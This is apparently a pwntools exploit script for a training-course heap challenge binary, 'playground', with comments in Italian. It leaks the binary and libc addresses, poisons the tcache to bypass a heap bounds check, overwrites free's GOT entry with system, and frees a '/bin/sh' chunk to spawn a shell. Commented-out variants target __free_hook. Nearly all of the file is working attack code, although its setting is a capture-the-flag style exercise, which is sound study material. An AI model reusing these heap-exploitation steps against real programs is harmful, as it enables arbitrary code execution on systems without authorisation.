from pwn import *

context.update(arch='amd64', os='linux')
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
libc=ELF("./libc-2.27.so") 
binary=ELF("./playground")
context.binary=binary

if "REMOTE" not in args:
    
    p = process("./playground")
    gdb.attach(p, """
        # b *0x00401255
        """)

    input("wait")
else:
    p = remote("bin.training.offdef.it", 4110)


def malloc(size):
    p.recvuntil(b"> ")
    p.sendline(b"malloc %d" % size)
    p.recvuntil(b"==> ")
    address = int(p.recvuntil(b"\n"), 16)
    return address

def free(ptr):
    p.recvuntil(b"> ")
    p.sendline(b"free %#x" % ptr)
    p.recvuntil(b"==> ok\n")

def last(ptr):
    p.recvuntil(b"> ")
    p.sendline(b"free %#x" % ptr)

def show(ptr, size):
    output = []
    p.recvuntil(b"> ")
    p.sendline(b"show %#x %d" % (ptr,size) )
    for i in range(size):
        data = p.recvline().split(b":   ")[1].strip()
        if data == b'':
            v = 0
        else:
            v = int(data, 16)
        output.append(v)
    return output

def write(ptr, payload):
    p.recvuntil(b"> ")
    command=f"write {hex(ptr)} {len(payload)}"
    p.sendline(command.encode())
    p.recvuntil(b"read\n")
    p.send(payload)
    return




#######  text leak
p.recvuntil(b"main: ")
main_addr=int(p.recvuntil(b"\n")[:-1],16)
binary_base=main_addr-binary.symbols["main"]
binary.address=binary_base
log.info(f"Binary base: {hex(binary.address)}")

######  Libc leak

chunk = malloc(1792) #0x700 > 0x500
malloc(20)
free(chunk)  # il freed chunk va nel unsorted bin
values = show(chunk, 8)
libc_leak = values[0]
libc_base=libc_leak- 0x3ebca0
libc.address=libc_base
log.info(f"libc_leak: {hex(libc_base)}")
print(values)

max_heap=binary.symbols["max_heap"]
min_heap=binary.symbols["min_heap"]
free_hook=libc.symbols["__free_hook"]
system=libc.symbols["system"]

log.info(f"Max_heap: {hex(max_heap)}")
log.info(f"Min_heap: {hex(min_heap)}")
log.info(f"Free_hook: {hex(free_hook)}")
log.info(f"System: {hex(system)}")

addr=malloc(128)  # uso chunk che è stato freed prima
free(addr)  # va a finire nella tcache
write(addr,p64(min_heap-8))  # overwrite min_heap with 0 sfrutta la e->key =null usando il -8 bytes per mettere min_heap=0
malloc(128)  #gives back addr
malloc(128)   #gives back min_heap-8

write(binary.symbols["got.free"], p64(system))
write(addr, b"/bin/sh\x00")
last(addr)    

p.interactive()

##### altro modo per leakare libc
#leak=show(binary.symbols["got.malloc"])
#libc_base=leak-libc.symbols["malloc"]

##### se fosse full_relro non posso sovrascrivere got.free
#write(max_heap, b"\xff"*8)
#write(free_hook,p64(system))
